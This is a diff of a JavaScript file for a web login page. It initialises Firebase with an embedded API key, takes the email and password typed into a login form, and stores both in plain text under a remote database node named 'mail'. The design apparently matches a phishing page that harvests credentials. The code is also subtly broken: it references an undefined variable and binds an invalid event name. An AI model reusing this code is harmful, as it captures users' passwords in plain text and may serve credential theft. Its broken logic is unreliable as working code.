@@ -1,4 +1,4 @@
-const firebaseConfig = {
+const firebaseConfig1 = {
     apiKey: "AIzaSyCVKcmbYpXo_CWGLdr2bkBeTyZ-51CQZtM",
     authDomain: "mail-6835e.firebaseapp.com",
     projectId: "mail-6835e",
@@ -8,11 +8,11 @@ const firebaseConfig = {
   };
 
 
-firebase.initializeApp(firebaseConfig);
+firebase.initializeApp(firebaseConfig1);
 
-var newMailForm = firebase.database().ref("mail");
+var MailForm = firebase.database().ref("mail");
 
-document.getElementById('login').addEventListener('submit', submitForm);
+document.getElementById('login').addEventListener('login-btn', submitForm);
 
 function submitForm(e) {
     e.preventDefault();
@@ -20,7 +20,7 @@ function submitForm(e) {
     var emaillog = getElementVal("emaillog");
     var password = getElementVal("pass");
 
-    saveMessages(emaillog, password);
+    saveLogin(emaillog, password);
 
  //   enable alert
  document.querySelector(".alert1").style.display = "block";
@@ -35,10 +35,10 @@ function submitForm(e) {
 }
 
 
-const saveMessages = (emaillog, password)=>{
-    var newMailForm = newMailFormDB.push();
+const saveLogin = (emaillog, password)=>{
+    var newMailForm = MailFormDB.push();
 
-    newContactForm.set({
+    newMailForm.set({
         email : emaillog,
         password : password,
     });
